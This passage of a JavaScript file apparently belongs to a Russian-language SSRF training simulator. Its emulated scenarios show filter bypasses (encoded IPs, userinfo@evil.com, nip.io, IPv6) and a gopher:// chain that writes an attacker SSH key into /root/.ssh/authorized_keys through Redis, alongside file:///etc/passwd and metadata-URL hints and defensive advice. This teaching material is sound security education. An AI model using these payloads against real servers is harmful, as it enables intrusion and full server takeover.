      'Представьте, что разработчик добавил проверку: «если URL содержит 127.0.0.1 или localhost — отклонить». Кажется, надёжно? Но что если атакующий напишет http://127.0.0.1@evil.com (учётные данные в URL) или http://evil.com#@127.0.0.1 (фрагмент) или http://0x7f000001 (hex-формат IP)? Разные библиотеки по-разному разбирают URL, и валидатор может увидеть один адрес, а HTTP-клиент — другой. Ниже показаны несколько техник обхода — попробуйте каждую!',
    placeholder: 'http://0x7f000001@evil.com/admin',
    matchUrl: (url) =>
      url.includes('0x7f') || url.includes('0177') || url.includes('2130706433') ||
      url.includes('0x7f000001') || url.includes('[::]') || url.includes('[::ffff:') ||
      url.includes('@evil.com') || url.includes('#@') || url.includes('nip.io') ||
      url.includes('localtest.me') || url.includes('127.1') || url.includes('0.0.0.0'),
    emulatedResponse: (url) => {
      if (url.includes('0x7f') || url.includes('0x7f000001') || url.includes('2130706433')) {
        return {
          technique: 'Hex / Decimal IP Encoding',
          filter_saw: '0x7f000001 или 2130706433 — не распознано как 127.0.0.1',
          client_resolved: '127.0.0.1 (localhost)',
          result: 'BYPASSED — фильтр не понял, что это localhost',
          response: {
            status: 200,
            page: 'Admin Panel (accessed via 0x7f000001)',
            warning: 'Фильтр пропустил, потому что проверял строковое совпадение "127.0.0.1", а пришёл hex-формат',
          },
          bypass_variants: [
            '0x7f000001 → 127.0.0.1 (hex)',
            '0177.0.0.1 → 127.0.0.1 (octal)',
            '2130706433 → 127.0.0.1 (decimal)',
            '0x7f.0.0.1 → 127.0.0.1 (mixed hex)',
          ],
        };
      }
      if (url.includes('@evil.com') || url.includes('#@')) {
        return {
          technique: 'URL Credentials / Fragment Bypass',
          filter_saw: 'evil.com — домен есть в белом списке!',
          client_requested: 'http://127.0.0.1/admin (host часть до @)',
          result: 'BYPASSED — валидатор проверил домен, а HTTP-клиент использовал хост до @',
          response: {
            status: 200,
            page: 'Admin Panel',
            warning: 'Валидатор видел evil.com (в белом списке), но HTTP-клиент отправил запрос на 127.0.0.1',
          },
          bypass_variants: [
            'http://127.0.0.1@evil.com → запрос на 127.0.0.1',
            'https://evil.com#@127.0.0.1 → фрагмент, сервер может обработать',
            'http://expected-host:password@evil-host → с учётными данными',
          ],
        };
      }
      if (url.includes('nip.io') || url.includes('localtest.me') || url.includes('127.1')) {
        return {
          technique: 'DNS-based Bypass (Redirect / Wildcard DNS)',
          filter_saw: 'company.127.0.0.1.nip.io — не содержит "localhost" или "127.0.0.1" напрямую',
          dns_resolved: '127.0.0.1 (nip.io резолвит IP из поддомена)',
          result: 'BYPASSED — DNS-сервер nip.io возвращает 127.0.0.1',
          response: {
            status: 200,
            page: 'Admin Panel (accessed via nip.io DNS rebinding)',
            warning: 'nip.io — легитимный сервис. Фильтр не блокирует его, но DNS возвращает 127.0.0.1',
          },
          bypass_variants: [
            'http://company.127.0.0.1.nip.io → 127.0.0.1',
            'http://localtest.me → 127.0.0.1 (всегда)',
            'http://127.1 → 127.0.0.1 (сокращённая запись)',
            'http://[::ffff:127.0.0.1] → 127.0.0.1 (IPv6-embedded)',
          ],
        };
      }
      if (url.includes('[::]') || url.includes('[::ffff:')) {
        return {
          technique: 'IPv6 Notation Bypass',
          filter_saw: '[::] или [::ffff:127.0.0.1] — фильтр проверял только IPv4',
          client_resolved: '::1 (localhost IPv6) или 127.0.0.1 (IPv4-mapped)',
          result: 'BYPASSED — IPv6-адреса не были в блоклисте',
          response: {
            status: 200,
            page: 'Admin Panel (accessed via IPv6)',
            warning: 'Многие фильтры проверяют только IPv4-адреса. IPv6 [::] = localhost, [::ffff:127.0.0.1] = IPv4-mapped',
          },
          bypass_variants: [
            'http://[::]:8080/ → IPv6 unspecified/localhost',
            'http://[0000::1]:8080/ → IPv6 loopback',
            'http://[::ffff:127.0.0.1]/ → IPv4-mapped IPv6',
            'http://[0:0:0:0:0:ffff:127.0.0.1]/ → полный формат',
          ],
        };
      }
      return { status: 400, error: 'Unknown bypass technique. Попробуйте: http://0x7f000001@evil.com, http://company.127.0.0.1.nip.io, http://[::]:8080/' };
    },
    responseAnnotation:
      'Посмотрите на поле «filter_saw» vs «client_resolved/requested» — это и есть суть атаки. Валидатор и HTTP-клиент видят РАЗНЫЕ адреса из одного и того же URL. Это происходит из-за сложности стандарта URL (RFC 3986) и того факта, что разные библиотеки по-разному его реализуют. Один парсер видит домен, другой — IP, третий — IPv6. Никогда не полагайтесь на строковую проверку URL.',
    explanation:
      'Обход SSRF-фильтров основан на inconsistency (несогласованности) между тем, как URL-валидатор и HTTP-клиент разбирают один и тот же URL. Стандарт URL (RFC 3986) содержит множество особенностей: учётные данные (user:pass@host), фрагменты (#fragment), разные форматы IP (hex, octal, decimal, IPv6-embedded), редкие IP-адреса (0.0.0.0, 127.0.1, 127.127.127.127), DNS-сервисы с wildcard-резолвингом (nip.io, localtest.me). Если валидатор написан на JavaScript, а HTTP-клиент на Python (или наоборот), они почти гарантированно по-разному разберут URL. Единственная надёжная защита — whitelist конкретных доменов с DNS-pinining (resolving до IP и проверка IP перед запросом, с использованием того же IP для фактического соединения).',
    realWorldExample:
      'На платформе HackerOne множественные SSRF-отчёты показывают обходы через: URL-credentials (http://127.0.0.1@allowed-domain.com), URL-fragments (http://allowed-domain.com#@127.0.0.1), IPv6 notation (http://[::ffff:127.0.0.1]), и редкие IP-форматы. Один из отчётов (Shopify, $20,000) использовал сочетание URL-encoding и parse discrepancy для обхода whitelist-фильтра.',
    stepByStep: [
      'Атакующий видит, что приложение блокирует 127.0.0.1 и localhost через чёрный список.',
      'Он пробует альтернативные представления: 0x7f000001 (hex), 0177.0.0.1 (octal), 2130706433 (decimal).',
      'Валидатор не распознаёт эти форматы как 127.0.0.1 и пропускает запрос.',
      'HTTP-клиент (cURL, requests) корректно резолвит адрес и отправляет запрос на 127.0.0.1.',
      'Запрос достигает внутреннего сервиса — фильтр обойдён.',
      'Атакующий систематически перебирает все известные техники обхода, пока одна не сработает.',
    ],
    severity: 'critical',
  },
  {
    id: 8,
    name: 'Эксплуатация через gopher:// (Redis RCE)',
    category: 'Продвинутые техники',
    description:
      'Протокол gopher:// позволяет отправлять произвольные TCP-данные на любой хост:порт. Это один из самых опасных SSRF-векторов, потому что через него можно не только читать данные, но и отправлять команды во внутренние сервисы. Наиболее частая цель — Redis: через gopher:// атакующий отправляет Redis-команды (например, запись файла, настройку SSH-ключа) и получает удалённое выполнение кода (RCE) на сервере.',
    preExplanation:
      'Все предыдущие сценарии использовали HTTP/HTTPS — протоколы для чтения данных. Но что если мы можем отправлять ЛЮБЫЕ TCP-данные? Протокол gopher:// делает именно это: gopher://host:port/_DATA отправляет DATA как сырые байты на host:port. Это открывает возможность атаковать не-HTTP сервисы: Redis, Memcached, FTP, SMTP. Самый впечатляющий пример — Redis без пароля: через gopher:// атакующий отправляет Redis-команды для записи своего SSH-ключа в authorized_keys и получает полный доступ к серверу. Ниже эмулируется эта атака.',
    placeholder: 'gopher://10.0.1.20:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
    matchUrl: (url) => url.startsWith('gopher://') || url.startsWith('dict://') || url.startsWith('ftp://') || url.startsWith('ldap://'),
    emulatedResponse: (url) => {
      if (url.startsWith('gopher://')) {
        return {
          protocol: 'gopher://',
          target: url.match(/gopher:\/\/([^:/]+)/)?.[1] || '10.0.1.20',
          port: parseInt(url.match(/:(\d+)/)?.[1] || '6379', 10),
          attack_chain: [
            {
              step: 1,
              action: 'FLUSHALL',
              command: '*1\r\n$8\r\nflushall\r\n',
              purpose: 'Очистить все данные Redis (подготовка)',
              result: '+OK',
            },
            {
              step: 2,
              action: 'CONFIG SET dir /root/.ssh',
              command: '*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/root/.ssh\r\n',
              purpose: 'Установить директорию для сохранения данных Redis',
              result: '+OK',
            },
            {
              step: 3,
              action: 'CONFIG SET dbfilename authorized_keys',
              command: '*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$15\r\nauthorized_keys\r\n',
              purpose: 'Установить имя файла для сохранения',
              result: '+OK',
            },
            {
              step: 4,
              action: 'SET sshkey "attacker-public-key"',
              command: '*3\r\n$3\r\nSET\r\n$6\r\nsshkey\r\n$100\r\nssh-rsa AAAAB3... attacker@evil.com\r\n',
              purpose: 'Записать публичный SSH-ключ атакующего',
              result: '+OK',
            },
            {
              step: 5,
              action: 'SAVE',
              command: '*1\r\n$4\r\nSAVE\r\n',
              purpose: 'Сохранить данные Redis в файл /root/.ssh/authorized_keys',
              result: '+OK',
            },
          ],
          final_result: 'RCE ACHIEVED — SSH-ключ атакующего записан в /root/.ssh/authorized_keys. Атакующий может подключиться: ssh root@target-server',
          impact: 'Полный контроль над сервером через SSH. Все данные на сервере скомпрометированы.',
        };
      }
      if (url.startsWith('dict://')) {
        return {
          protocol: 'dict://',
          target: 'Redis or other dict-compatible service',
          usage: 'dict://host:port/command — отправляет команду сервису через протокол DICT',
          example_response: {
            service: 'Redis',
            command: 'dict://10.0.1.20:6379/INFO',
            response: '# Server\r\nredis_version:7.2.3\r\nos:Linux 5.15.0-91-generic x86_64\r\ntcp_port:6379\r\nuptime_in_days:42\r\nconnected_clients:15\r\nused_memory_human:2.41G\r\n',
            note: 'Через dict:// можно отправлять Redis-команды и читать ответы. Менее гибкий, чем gopher://, но работает при ограничениях протоколов.',
          },
        };
      }
      return {
        protocol: url.split('://')[0] + '://',
        note: 'Поддержка не-HTTP протоколов (gopher, dict, ftp, ldap) в HTTP-клиенте — критическая уязвимость конфигурации. Отключайте все протоколы кроме http/https.',
      };
    },
    responseAnnotation:
      'Посмотрите на attack_chain: это последовательность из 5 Redis-команд, каждая отправлена через gopher://. Команда FLUSHALL уничтожает все данные (жёстко, но эффективно для атаки). Затем CONFIG SET направляет Redis сохранять данные в /root/.ssh/authorized_keys. Команда SET записывает SSH-ключ атакующего. Команда SAVE сохраняет на диск. Результат: атакующий может подключиться по SSH с root-доступом. Вся цепочка — через один SSRF-запрос с gopher:// протоколом.',
    explanation:
      'Протокол gopher:// — один из старейших интернет-протоколов (RFC 1436, 1993). Он позволяет отправлять произвольные данные на любой TCP-порт. Когда SSRF-уязвимое приложение поддерживает gopher:// (cURL по умолчанию поддерживает), атакующий может: отправлять команды в Redis (и получить RCE через запись SSH-ключа или cron job), отправлять запросы в Memcached, подключаться к внутренним SMTP-серверам для отправки фишинговых писем от имени компании, читать данные через(dict:// — упрощённая версия gopher://). Для защиты: в cURL используйте CURLOPT_PROTOCOLS для разрешения только http/https. В Python requests можно перехватить схему URL. В Java ограничьте URI schemes через HttpURLConnection.',
    realWorldExample:
      'Одна из самых известных демонстраций gopher:// SSRF — инструмент Gopherus (tarunkant/Gopherus), который автоматически генерирует gopher-пейлоады для получения RCE через SSRF в Redis, MySQL, PostgreSQL, FastCGI и других сервисах. В реальном инциденте 2019 года через SSRF с gopher:// атакующие получили RCE на сервере, используя Redis без аутентификации, и развернули криптомайнер.',
    stepByStep: [
      'Атакующий обнаруживает, что SSRF-уязвимое приложение использует cURL (поддерживает gopher://).',
      'Через порт-сканирование (сценарий #4) находит Redis 6379 без пароля.',
      'Формирует gopher:// URL с Redis-командами: FLUSHALL → CONFIG SET dir → CONFIG SET dbfilename → SET key → SAVE.',
      'URL-кодирует команды и отправляет через SSRF-уязвимую функцию.',
      'cURL на сервере отправляет команды на Redis. Redis выполняет их и сохраняет SSH-ключ в файл.',
      'Атакующий подключается по SSH: ssh -i attacker_key root@target — полный доступ получен.',
    ],
    severity: 'critical',
  },
];

export function findMatchingScenario(url) {
  const trimmed = url.trim();
  for (const scenario of scenarios) {
    if (scenario.matchUrl(trimmed)) {
      return scenario;
    }
  }
  return null;
}

export function getEmulatedResponse(url) {
  const scenario = findMatchingScenario(url);
  if (!scenario) {
    return {
      found: false,
      status: 404,
      error: 'Not Found',
      message: 'Ответ сервера: 404 Not Found (эмулировано). Указанный URL не соответствует ни одному известному вектору SSRF-атаки.',
      hint: 'Подсказка: выберите сценарий из списка выше, или попробуйте вручную: http://169.254.169.254/latest/meta-data/, http://localhost/admin, file:///etc/passwd, gopher://10.0.1.20:6379/',
    };
  }
  const response = scenario.emulatedResponse(url);
  return {
    found: true,
    scenarioName: scenario.name,
    scenarioId: scenario.id,
    severity: scenario.severity,
    category: scenario.category,
    data: response,
    responseAnnotation: scenario.responseAnnotation,
    preExplanation: scenario.preExplanation,
    explanation: scenario.explanation,
    realWorldExample: scenario.realWorldExample,
    stepByStep: scenario.stepByStep,
  };
}